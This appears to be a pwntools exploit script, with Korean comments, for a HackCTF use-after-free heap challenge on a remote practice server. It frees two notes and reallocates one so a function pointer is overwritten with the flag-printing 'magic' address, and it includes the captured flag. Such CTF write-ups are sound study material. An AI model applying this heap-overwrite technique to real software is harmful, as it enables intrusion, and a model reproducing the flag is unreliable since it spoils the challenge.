#! -*- coding: utf-8 -*-
from pwn import * 

#p = process("./uaf")
p = remote("ctf.j0n9hyun.xyz",3020)

pf_plt = 0x80484a0	#printf plt 
note_list = 0x804b070
magic = 0x08048986 

# 힙 문제로 추정. 
# 노트 추가, 삭제, 출력이 있고 삭제한 노트를 출력하려 하면 에러가 발생한다.
# 힙 문제면.. 우선 로컬에서 안될 가능성이 높다
# 노트를 추가할 때 마다 입력한 내용이 들어가는 힙 하나와
# 특정 함수의 주소+문자열 힙의 주소를 가지고 있는 0x10짜리 힙 하나가 같이 할당되는데
# 출력함수에서 저 힙의 주소를 참조하여 함수를 호출, 힙의 내용을 출력한다. 
# 할당 해제 시 다른 내용은 그대로 냅둔 채 , 
# 출력함수의 주소가 있는 부분과 문자열의 첫 4바이트만 날린다. (free 함수를 호출. ) 
# 이후 재 할당시 같은 주소공간을 그대로 사용한다. 
# 뭘 해야할진 대략적으로 보인다. 함수 주소가 있는 부분을 덮어 씌우라는 이야기같다. 
# 그 다음, 다른 바이트 크기로 재 할당시 함수주소가 있는 부분은 그대로 쓰고, 
# 새롭게 바이트 공간을 할당해서 사용하는게 보인다. 
# 일단 문자열을 넣는건 정해준 문자열 길이 이상으로는 못넣는걸로 보인다. 
# 일단 더블프리가 된다. 흠.. 
# 오, 크기를 8로 해주면 0x10 힙이 할당된다.
# 이미 => free 해 준 , 함수와 문자열 주소를 담는 힙에 원하는 내용을 할당 할 수 있을거란 얘기. 
# 순서상 주소힙 -> 문자열 힙 순으로 할당, 해제가 발생한다. 더블프리가 되니까
# 같은 인덱스를 두번 할당 해제해보자. 된다. 주소 힙이 덮어 씌워진다. 
# 그리고 주소 힙의 첫 4바이트에 주소를 넣어 원하는 함수도 호출할 수 있다. 
# 주소힙의 두번째 4바이트가 함수의 인자로 들어가니까, 별의별거 다 출력할 수있을듯. 
# 전역변수 상 notelist 라는 변수에 할당한 힙의 주소가 담기는게 확인된다.
# 인덱스 순서대로 담기더라. 이 주소를 출력하면 힙의 주소를 가져올 수 있겠다.
# 내부적으로 호출하는 print_note_content 함수가 힙위치 + 4 내용을 출력하는  동작이더라. 
# 플래그를 출력하는 magic 이라는 함수가 있다... 
# 이 문제, 어렵게 만들려면 충분히 더 어렵게 만들 수 있었던 문제인것 같다.
# 앗, 리모트에서는 더블 프리 에러가 막힌다. 이런.. 더블프리 안하고 풀어야 되는 문제네. 
# 그럼 간단하지. 그냥 두개 프리해주자. 그럼 주소힙이 두개 생긴다. 그리고 새로 할당하면
# 먼저 할당 해제한 주소힙에 입력한 값들이 들어가게 된다. 
# HackCTF{n0w_17'5_71m3_70_h34p_57udy}

def add(size,note) : 
	p.sendlineafter("입력 :","1")
	p.sendlineafter("크기 :",str(size))
	p.sendlineafter("내용 :",note)
	
def dn(idx) :
	p.sendlineafter("입력 :","2")
	p.sendlineafter("Index :",str(idx))
	
def pn(idx) : 
	p.sendlineafter("입력 :","3")
	p.sendlineafter("Index :",str(idx))
	
	
if __name__ == "__main__" : 
	pause()
	add(0x10,"A"*10)
	add(0x10,"A"*10)
	dn(0)
	dn(1)
	add(0x8,p32(magic))
	pn(0)
	
	p.interactive()